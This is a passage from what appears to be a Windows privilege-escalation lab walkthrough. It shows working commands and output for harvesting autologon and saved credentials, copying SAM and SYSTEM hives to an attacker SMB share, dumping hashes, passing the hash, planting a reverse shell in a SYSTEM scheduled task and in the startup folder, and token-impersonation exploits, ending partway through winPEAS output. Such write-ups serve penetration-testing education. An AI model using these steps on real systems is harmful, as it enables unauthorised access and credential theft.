HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\ServerManager\ServicingStorage\ServerComponentCache\Web-Digest-Auth
    Description    REG_SZ    Digest authentication works by sending a password hash to a Windows domain controller to authenticate users. When you need improved security over Basic authentication, consider using Digest authentication, especially if users who must be authenticated access your Web site from behind firewalls and proxy servers.

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\Credential Providers\{2135f72a-90b5-4ed3-a7f1-8bb705ac276a}
    (Default)    REG_SZ    PicturePasswordLogonProvider

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\Credential Providers\{60b78e88-ead8-445c-9cfd-0b87f74ea6cd}
    (Default)    REG_SZ    PasswordProvider

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\SO\AUTH\LOGON\ASK
    Text    REG_SZ    Prompt for user name and password

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\SO\AUTH\LOGON\SILENT
    Text    REG_SZ    Automatic logon with current user name and password

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\XWizards\Components\{29EA1611-529B-4113-8EE3-EE0F6DD2C715}
    (Default)    REG_SZ    RASGCW Change Password Page

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\XWizards\Components\{3bfe6eb7-281d-4333-999e-e949e3621de7}
    (Default)    REG_SZ    Cert Password UI Page

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\XWizards\Components\{9cb233a5-a4a5-46b9-ab13-db07ce949410}
    (Default)    REG_SZ    Password retry UI Page

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\XWizards\Components\{d9162b5b-ca81-476e-a310-cb32d932733c}
    (Default)    REG_SZ    Password Expired UI Page

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Internet Explorer\Capabilities\Roaming\FormSuggest
    FilterIn    REG_SZ    FormSuggest Passwords,Use FormSuggest,FormSuggest PW Ask

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Authentication\Credential Providers\{2135f72a-90b5-4ed3-a7f1-8bb705ac276a}
    (Default)    REG_SZ    PicturePasswordLogonProvider

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Authentication\Credential Providers\{60b78e88-ead8-445c-9cfd-0b87f74ea6cd}
    (Default)    REG_SZ    PasswordProvider

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Internet Settings\SO\AUTH\LOGON\ASK
    Text    REG_SZ    Prompt for user name and password

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Internet Settings\SO\AUTH\LOGON\SILENT
    Text    REG_SZ    Automatic logon with current user name and password

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\XWizards\Components\{29EA1611-529B-4113-8EE3-EE0F6DD2C715}
    (Default)    REG_SZ    RASGCW Change Password Page

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\XWizards\Components\{3bfe6eb7-281d-4333-999e-e949e3621de7}
    (Default)    REG_SZ    Cert Password UI Page

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\XWizards\Components\{9cb233a5-a4a5-46b9-ab13-db07ce949410}
    (Default)    REG_SZ    Password retry UI Page

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\XWizards\Components\{C100BED7-D33A-4A4B-BF23-BBEF4663D017}
    (Default)    REG_SZ    WCN Password - PIN

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\XWizards\Components\{C100BEEB-D33A-4A4B-BF23-BBEF4663D017}\Children\{C100BED7-D33A-4A4B-BF23-BBEF4663D017}
    (Default)    REG_SZ    WCN Password PIN

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\XWizards\Components\{d9162b5b-ca81-476e-a310-cb32d932733c}
    (Default)    REG_SZ    Password Expired UI Page

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Classes\CLSID\{2135f72a-90b5-4ed3-a7f1-8bb705ac276a}
    (Default)    REG_SZ    PicturePasswordLogonProvider

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Classes\CLSID\{29EA1611-529B-4113-8EE3-EE0F6DD2C715}
    (Default)    REG_SZ    RASGCW Change Password Class

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Classes\CLSID\{3bfe6eb7-281d-4333-999e-e949e3621de7}
    (Default)    REG_SZ    Cert Password UI class

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Classes\CLSID\{60b78e88-ead8-445c-9cfd-0b87f74ea6cd}
    (Default)    REG_SZ    PasswordProvider

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Classes\CLSID\{6BC0989B-0CE6-11D1-BAAE-00C04FC2E20D}\ProgID
    (Default)    REG_SZ    IAS.ChangePassword.1

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Classes\CLSID\{6BC0989B-0CE6-11D1-BAAE-00C04FC2E20D}\VersionIndependentProgID
    (Default)    REG_SZ    IAS.ChangePassword

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Classes\CLSID\{6f45dc1e-5384-457a-bc13-2cd81b0d28ed}
    (Default)    REG_SZ    V1PasswordProvider

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Classes\CLSID\{7A9D77BD-5403-11d2-8785-2E0420524153}
    InfoTip    REG_SZ    Manages users and passwords for this computer

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Classes\CLSID\{8841d728-1a76-4682-bb6f-a9ea53b4b3ba}
    (Default)    REG_SZ    LogonPasswordReset

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Classes\CLSID\{9cb233a5-a4a5-46b9-ab13-db07ce949410}
    (Default)    REG_SZ    Password retry UI class

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Classes\CLSID\{B4FB3F98-C1EA-428d-A78A-D1F5659CBA93}\shell
    (Default)    REG_SZ    changehomegroupsettings viewhomegrouppassword starthomegrouptroubleshooter sharewithdevices

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Classes\CLSID\{C98F3822-3658-4D75-8A25-6621665ECD56}
    (Default)    REG_SZ    HomeGroup Password Command

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Classes\CLSID\{d9162b5b-ca81-476e-a310-cb32d932733c}
    (Default)    REG_SZ    Password Expired UI class

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Classes\Interface\{06F5AD81-AC49-4557-B4A5-D7E9013329FC}
    (Default)    REG_SZ    IHomeGroupPassword

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Classes\Interface\{3CD62D67-586F-309E-A6D8-1F4BAAC5AC28}
    (Default)    REG_SZ    _PasswordDeriveBytes

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Classes\Interface\{4557D1F9-A47E-5A8A-B6F2-74B42EF7F09E}
    (Default)    REG_SZ    __FITypedEventHandler_2_WebRuntime__CBrowsingContext_WebRuntime__CAutoPasswordPermissionRequestedEventArgs

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Classes\Interface\{46ACA899-50F6-4A46-A9E3-273705CA4914}
    (Default)    REG_SZ    IPicturePasswordTaskHandler

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Classes\Interface\{53E78940-B62E-49F8-A69B-84CB8963A513}
    (Default)    REG_SZ    IPasswordOnWakeSetting

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Classes\Interface\{61fd2c0b-c8d4-48c1-a54f-bc5a64205af2}
    (Default)    REG_SZ    IPasswordVault

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Classes\Interface\{68FFF241-CA49-4754-A3D8-4B4127518549}
    (Default)    REG_SZ    ISupportPasswordMode

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Classes\Interface\{6ab18989-c720-41a7-a6c1-feadb36329a0}
    (Default)    REG_SZ    IPasswordCredential

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Classes\Interface\{97F17EF9-284E-4992-AE46-748EF75225BB}
    (Default)    REG_SZ    __x_ABI_CWebRuntime_CIAutoPasswordPermissionRequestedEventArgs

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Classes\Interface\{a1ac5012-3c00-5b22-adc1-095f7e86ca11}
    (Default)    REG_SZ    __FIVectorView_1_Windows__CSecurity__CCredentials__CIPasswordCredential

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Classes\Interface\{B0619C15-5B93-412E-AF8D-878F23B1A437}
    (Default)    REG_SZ    __x_Windows_CInternal_CUI_CAuth_CEnrollment_CIPasswordCredentialEnrollment

HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Terminal Server\DefaultUserConfiguration
    Password    REG_SZ    

HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Terminal Server\WinStations\RDP-Tcp
    Password    REG_SZ    

HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\RemoteAccess\Policy\Pipeline\23
    (Default)    REG_SZ    IAS.ChangePassword

HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Control\Terminal Server\DefaultUserConfiguration
    Password    REG_SZ    

HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Control\Terminal Server\WinStations\RDP-Tcp
    Password    REG_SZ    

HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Services\RemoteAccess\Policy\Pipeline\23
    (Default)    REG_SZ    IAS.ChangePassword

HKEY_LOCAL_MACHINE\SYSTEM\DriverDatabase\DriverPackages\ehstorpwddrv.inf_amd64_d14b2d0cd98ecf84\Strings
    devicename    REG_SZ    Microsoft supported IEEE 1667 password silo

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\DefaultUserConfiguration
    Password    REG_SZ    

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp
    Password    REG_SZ    

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\RemoteAccess\Policy\Pipeline\23
    (Default)    REG_SZ    IAS.ChangePassword

End of search: 258 match(es) found.
```

### It's better query something specific in order to find admin AutoLogin credentials:

```
C:\PrivEsc>reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\winlogon
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0
    CachedLogonsCount    REG_SZ    10
    DebugServerCommand    REG_SZ    no
    DefaultDomainName    REG_SZ    
    DefaultUserName    REG_SZ    admin
    DisableBackButton    REG_DWORD    0x1
    EnableSIHostIntegration    REG_DWORD    0x1
    ForceUnlockLogon    REG_DWORD    0x0
    LegalNoticeCaption    REG_SZ    
    LegalNoticeText    REG_SZ    
    PasswordExpiryWarning    REG_DWORD    0x5
    PowerdownAfterShutdown    REG_SZ    0
    PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}
    ReportBootOk    REG_SZ    1
    Shell    REG_SZ    explorer.exe
    ShellCritical    REG_DWORD    0x0
    ShellInfrastructure    REG_SZ    sihost.exe
    SiHostCritical    REG_DWORD    0x0
    SiHostReadyTimeOut    REG_DWORD    0x0
    SiHostRestartCountLimit    REG_DWORD    0x0
    SiHostRestartTimeGap    REG_DWORD    0x0
    Userinit    REG_SZ    C:\Windows\system32\userinit.exe,
    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile
    WinStationsDisabled    REG_SZ    0
    scremoveoption    REG_SZ    0
    DisableCAD    REG_DWORD    0x1
    LastLogOffEndTimePerfCounter    REG_QWORD    0xe3c24390
    ShutdownFlags    REG_DWORD    0x80000027
    AutoAdminLogon    REG_SZ    0
    AutoLogonSID    REG_SZ    S-1-5-21-3025105784-3259396213-1915610826-1001
    LastUsedUsername    REG_SZ    admin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\winlogon\AlternateShells
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\winlogon\GPExtensions
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\winlogon\UserDefaults
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\winlogon\AutoLogonChecked
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\winlogon\VolatileUserMgrKey
```

### Best way to filter the winlogon credentials by querying with this command

```
C:\PrivEsc>reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
    DefaultDomainName    REG_SZ    
    DefaultUserName    REG_SZ    admin

C:\PrivEsc>
```

On PentestOS, use the `psexec.py`, `wmiexec.py` or other pentest tools to execute a command to spawn a command prompt running with the admin privileges (update the password with the one you found):

```
$ wmiexec.py admin:password123@10.10.169.126
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>dir
 Volume in drive C has no label.
 Volume Serial Number is 54A8-AA62

 Directory of C:\

06/05/2020  07:32 AM    <DIR>          DevTools
09/14/2018  11:19 PM    <DIR>          PerfLogs
01/30/2021  01:06 PM    <DIR>          PrivEsc
06/05/2020  07:32 AM    <DIR>          Program Files
06/04/2020  05:11 PM    <DIR>          Program Files (x86)
06/05/2020  07:32 AM    <DIR>          Temp
06/05/2020  07:38 AM    <DIR>          Users
01/30/2021  01:22 PM    <DIR>          Windows
               0 File(s)              0 bytes
               8 Dir(s)  31,262,126,080 bytes free

C:\>whoami
win-qba94kb3iof\admin
```

## Passwords - Saved Creds

List any saved credentials:

```
# nc -nvlp 53
Connection from 10.10.169.126:49854
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\PrivEsc>cmdkey /list
cmdkey /list

Currently stored credentials:

* NONE *

C:\PrivEsc>
```

Note that credentials for the "admin" user are saved. If they aren't, run the C:\\PrivEsc\\savecred.bat script to refresh the saved credentials.

Start a listener on Kali and run the reverse.exe executable using runas with the admin user's saved credentials:

### Victim Machine via RDP/SSH Remote session

```
C:\PrivEsc>runas /savecred /user:admin rsh.exe
Attempting to start rsh.exe as user "WIN-QBA94KB3IOF\admin" ...
```

### Attacker Machine

```
# nc -nvlp 53
Connection from 10.10.169.126:49878
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami 
whoami
win-qba94kb3iof\admin
```

## Passwords - Security Account Manager (SAM)

The **SAM** and **SYSTEM** files can be used to extract user password hashes. This VM has insecurely stored backups of the SAM and SYSTEM files in the `C:\Windows\Repair\` directory.

Transfer the SAM and SYSTEM files to your PentestOS VM:

### Attacker SMB server

```
$ sudo smbserver.py attacker .
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

### Victim Machine

```
C:\PrivEsc>copy C:\Windows\Repair\SAM \\10.9.132.165\attacker\
copy C:\Windows\Repair\SAM \\10.9.132.165\attacker\
        1 file(s) copied.

C:\PrivEsc>copy C:\Windows\Repair\SYSTEM \\10.9.132.165\attacker\
copy C:\Windows\Repair\SYSTEM \\10.9.132.165\attacker\
```

### Attacker SMB server

```
$ sudo smbserver.py attacker .
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.169.126,49894)
[*] AUTHENTICATE_MESSAGE (WIN-QBA94KB3IOF\user,WIN-QBA94KB3IOF)
[*] User WIN-QBA94KB3IOF\user authenticated successfully
[*] user::WIN-QBA94KB3IOF:4141414141414141:9a8a3e2b919564b32f29590f109b4a13:0101000000000000006f23354ff7d60185c7d4eb61d7a68e000000000100100065006600460042007600590077004700030010006500660046004200760059007700470002001000740071005900410068004b005900540004001000740071005900410068004b005900540007000800006f23354ff7d601060004000200000008003000300000000000000000000000002000006a55e834aaf91d5db443721d2512da8377bc910067bd289fc23332fdcc199aa40a001000000000000000000000000000000000000900220063006900660073002f00310030002e0039002e003100330032002e00310036003500000000000000000000000000
[*] Disconnecting Share(1:IPC$)
[*] Disconnecting Share(2:ATTACKER)
[*] Handle: 'ConnectionResetError' object is not subscriptable
[*] Closing down connection (10.10.169.126,49894)
[*] Remaining connections []
[*] Incoming connection (10.10.169.126,49896)
[*] AUTHENTICATE_MESSAGE (WIN-QBA94KB3IOF\user,WIN-QBA94KB3IOF)
[*] User WIN-QBA94KB3IOF\user authenticated successfully
[*] user::WIN-QBA94KB3IOF:4141414141414141:672188236900645d94810a827a9b74f8:010100000000000000310f414ff7d601ecdc6f775741084f000000000100100065006600460042007600590077004700030010006500660046004200760059007700470002001000740071005900410068004b005900540004001000740071005900410068004b00590054000700080000310f414ff7d601060004000200000008003000300000000000000000000000002000006a55e834aaf91d5db443721d2512da8377bc910067bd289fc23332fdcc199aa40a001000000000000000000000000000000000000900220063006900660073002f00310030002e0039002e003100330032002e00310036003500000000000000000000000000

$ ls
rsh.exe  rsh.msi  SAM  SYSTEM  winrprivesc.md
[user@userdragon winprivesc]$ file SAM SYSTEM 
SAM:    MS Windows registry file, NT/2000 or above
SYSTEM: MS Windows registry file, NT/2000 or above
```

On PentestOS, clone the [creddump7](https://github.com/moyix/creddump) repository (the one on PentestOS is outdated and will not dump hashes correctly for Windows 10!) and use it to dump out the hashes from the SAM and SYSTEM files:

```
$ pwdump SYSTEM SAM
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
user:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
admin:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

After the hashed are dumped you can use password crackers like JohnTheRipper or Hashcat

## Passwords - Passing the Hash

Why crack a password hash when you can authenticate using the hash?

Use the full admin hash with pth-winexe to spawn a shell running as admin without needing to crack their password. Remember the full hash includes both the LM and NTLM hash, separated by a colon:

### pth-winexe
`$ pth-winexe -U 'admin%hash' //10.10.181.45 cmd.exe`

### Impacket tools like wmiexec.py or psexec.py
`$ wmiexec.py admin@10.10.181.45 -hashes [HASH]`

### CrackMapExec
`$ cme smb 10.10.181.45 -u admin -H [HASH]`

## Scheduled Tasks

View the contents of the `C:\DevTools\CleanUp.ps1` script:

```
C:\PrivEsc>type C:\DevTools\CleanUp.ps1
type C:\DevTools\CleanUp.ps1
# This script will clean up all your old dev logs every minute.
# To avoid permissions issues, run as SYSTEM (should probably fix this later)

Remove-Item C:\DevTools\*.log
```

The script seems to be running as SYSTEM every minute. Using `accesschk.exe`, note that you have the ability to write to this file:

```
C:\PrivEsc>accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1
accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1
RW C:\DevTools\CleanUp.ps1
    FILE_ADD_FILE
    FILE_ADD_SUBDIRECTORY
    FILE_APPEND_DATA
    FILE_EXECUTE
    FILE_LIST_DIRECTORY
    FILE_READ_ATTRIBUTES
    FILE_READ_DATA
    FILE_READ_EA
    FILE_TRAVERSE
    FILE_WRITE_ATTRIBUTES
    FILE_WRITE_DATA
    FILE_WRITE_EA
    DELETE
    SYNCHRONIZE
    READ_CONTROL
```

Start a listener on PentestOS and then append a line to the `C:\DevTools\CleanUp.ps1` which runs the rsh.exe executable you created:

### Victim Machine

```
C:\PrivEsc>echo C:\PrivEsc\rsh.exe >> C:\DevTools\CleanUp.ps1
echo C:\PrivEsc\rsh.exe >> C:\DevTools\CleanUp.ps1
```

### Attacker Machine

```
$ sudo nc -nvlp 53
[sudo] password for user: 
Connection from 10.10.181.45:49853
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

## Insecure GUI Apps

Start an RDP session as the "user" account:

`$ rdesktop -u user -p password321 10.10.181.45`

Double-click the "AdminPaint" shortcut on your Desktop. Once it is running, open a command prompt and note that Paint is running with admin privileges:

```
C:\Users\user>tasklist /V | findstr mspaint.exe
mspaint.exe                   2628 RDP-Tcp#3                  2     29,180 K Running         WIN-QBA94KB3IOF\admin                                   0:00:00 Untitled - Paint
```

## Startup Apps

Using accesschk.exe, note that the **BUILTIN\\Users** group can write files to the StartUp directory:

```
C:\PrivEsc>accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"

AccessChk v4.02 - Check access of files, keys, objects, processes or services
Copyright (C) 2006-2007 Mark Russinovich
Sysinternals - www.sysinternals.com

C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
  Medium Mandatory Level (Default) [No-Write-Up]
  RW BUILTIN\Users
  RW WIN-QBA94KB3IOF\Administrator
  RW WIN-QBA94KB3IOF\admin
  RW NT AUTHORITY\SYSTEM
  RW BUILTIN\Administrators
  R  Everyone
```

Using cscript, run the `C:\PrivEsc\CreateShortcut.vbs` script which should create a new shortcut to your reverse shell (rsh.exe) executable in the StartUp directory:
`C:\PrivEsc>cscript C:\PrivEsc\CreateShortcut.vbs`

Start a listener on PentestOS, and then simulate an admin logon using RDP and the credentials you previously extracted:

### Attacker Machine triggering the RDP session to gain a reverse shell

`$ rdesktop -u admin 10.10.181.45`

```
$ sudo nc -nlvp 53
Connection from 10.10.169.126:49773
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

## Token Impersonation - Rogue Potato

Set up a socat redirector on PentestOS, forwarding PentestOS port 135 to port 9999 on Windows:
`$ sudo socat tcp-listen:135,reuseaddr,fork tcp:10.10.181.45:9999`

Start a listener on PentestOS. Simulate getting a service account shell by logging into RDP as the admin user, starting an elevated command prompt (right-click -> run as administrator) and using `PSExec64.exe` to trigger the reverse shell (rsh.exe) executable you created with the permissions of the "local service" account:

```
C:\PrivEsc>PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\rsh.exe

PsExec v2.2 - Execute processes remotely
Copyright (C) 2001-2016 Mark Russinovich
Sysinternals - www.sysinternals.com
```

## Token Impersonation - PrintSpoofer
Start a listener on PentestOS. Simulate getting a service account shell by logging into RDP as the admin user, starting an elevated command prompt (right-click -> run as administrator) and using `PSExec64.exe` to trigger the reverse shell (reverse.exe) executable you created with the permissions of the "local service" account:

`C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe`

Start another listen on PentestOS

Now, in the "local service" reverse shell you triggered, run the PrintSpoofer exploit to trigger a second reverse shell running with SYSTEM privileges (update the IP address with your PentestOS IP accordingly):

### Victim Machine
`C:\PrivEsc\PrintSpoofer.exe -c "C:\PrivEsc\reverse.exe" -i`

### Attacker Machine
```
$ sudo nc -nlvp 53
Connection from 10.10.169.126:49773
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

wmic qfe get Caption, Description, HotFixID, InstalledOn
systeminfo | findstr /b /c:"OS Name" /c:"OS Version" /c:"System Type"
driverquery /v


## Privilege Escalation Scripts
### winPEASany.exe
```
C:\PrivEsc>winPEASany.exe
winPEASany.exe
   Creating Dynamic lists, this could take a while, please wait...
   - Checking if domain...
   - Getting Win32_UserAccount info...
   - Creating current user groups list...
   - Creating active users list...
   - Creating disabled users list...
   - Admin users list...
     
             *((,.,/((((((((((((((((((((/,  */               
      ,/*,..*((((((((((((((((((((((((((((((((((,           
    ,*/((((((((((((((((((/,  .*//((//**, .*(((((((*       
    ((((((((((((((((**********/########## .(* ,(((((((   
    (((((((((((/********************/####### .(. (((((((
    ((((((..******************/@@@@@/***/###### ./(((((((
    ,,....********************@@@@@@@@@@(***,#### .//((((((
    , ,..********************/@@@@@%@@@@/********##((/ /((((
    ..((###########*********/%@@@@@@@@@/************,,..((((
    .(##################(/******/@@@@@/***************.. /((
    .(#########################(/**********************..*((
    .(##############################(/*****************.,(((
    .(###################################(/************..(((
    .(#######################################(*********..(((
    .(#######(,.***.,(###################(..***.*******..(((
    .(#######*(#####((##################((######/(*****..(((
    .(###################(/***********(##############(...(((
    .((#####################/*******(################.((((((
    .(((############################################(..((((
    ..(((##########################################(..(((((
    ....((########################################( .(((((
    ......((####################################( .((((((
    (((((((((#################################(../((((((
        (((((((((/##########################(/..((((((
              (((((((((/,.  ,*//////*,. ./(((((((((((((((.
                 (((((((((((((((((((((((((((((/

ADVISORY: winpeas should be used for authorized penetration testing and/or educational purposes only.Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission.

  WinPEAS vBETA VERSION, Please if you find any issue let me know in https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/issues by carlospolop

  [+] Leyend:
         Red                Indicates a special privilege over an object or something is misconfigured
         Green              Indicates that some protection is enabled or something is well configured
         Cyan               Indicates active users
         Blue               Indicates disabled users
         LightYellow        Indicates links

   [?] You can find a Windows local PE Checklist here: https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation


  ==========================================(System Information)==========================================

  [+] Basic System Information(T1082&T1124&T1012&T1497&T1212)
   [?] Check if the Windows versions is vulnerable to some known exploit https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#kernel-exploits
    Hostname: WIN-QBA94KB3IOF
    ProductName: Windows Server 2019 Standard Evaluation
    EditionID: ServerStandardEval
    ReleaseId: 1809
    BuildBranch: rs5_release
    CurrentMajorVersionNumber: 10
    CurrentVersion: 6.3
    Architecture: AMD64
    ProcessorCount: 1
    SystemLang: en-US
    KeyboardLang: English (United States)
    TimeZone: (UTC-08:00) Pacific Time (US & Canada)
    IsVirtualMachine: False
    Current Time: 1/31/2021 9:40:03 AM
    HighIntegrity: False
    PartOfDomain: False
    Hotfixes: KB4514366, KB4512577, KB4512578, 

  [?] Windows vulns search powered by Watson(https://github.com/rasta-mouse/Watson)
    OS Build Number: 17763
       [!] CVE-2019-1315 : VULNERABLE
        [>] https://offsec.almond.consulting/windows-error-reporting-arbitrary-file-move-eop.html

       [!] CVE-2019-1385 : VULNERABLE
        [>] https://www.youtube.com/watch?v=K6gHnr-VkAg

       [!] CVE-2019-1388 : VULNERABLE
        [>] https://github.com/jas502n/CVE-2019-1388

       [!] CVE-2019-1405 : VULNERABLE
        [>] https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/november/cve-2019-1405-and-cve-2019-1322-elevation-to-system-via-the-upnp-device-host-service-and-the-update-orchestrator-service/

    Finished. Found 4 potential vulnerabilities.

  [+] PowerShell Settings()
    PowerShell v2 Version: 2.0
    PowerShell v5 Version: 5.1.17763.1
    Transcription Settings: 
    Module Logging Settings: 
    Scriptblock Logging Settings: 

  [+] Audit Settings(T1012)
   [?] Check what is being logged 
    Not Found

  [+] WEF Settings(T1012)
   [?] Windows Event Forwarding, is interesting to know were are sent the logs 
    Not Found

  [+] LAPS Settings(T1012)
   [?] If installed, local administrator password is changed frequently and is restricted by ACL 
    LAPS Enabled: LAPS not installed

  [+] Wdigest()
   [?] If enabled, plain-text crds could be stored in LSASS https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#wdigest
    Wdigest is not enabled

  [+] LSA Protection()
   [?] If enabled, a driver is needed to read LSASS memory (If Secure Boot or UEFI, RunAsPPL cannot be disabled by deleting the registry key) https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#lsa-protection
    LSA Protection is not enabled

  [+] Credentials Guard()
   [?] If enabled, a driver is needed to read LSASS memory https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#credential-guard
    CredentialGuard is not enabled

  [+] Cached Creds()
   [?] If > 0, credentials will be cached in the registry and accessible by SYSTEM user https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#cached-credentials
    cachedlogonscount is 10

  [+] User Environment Variables()
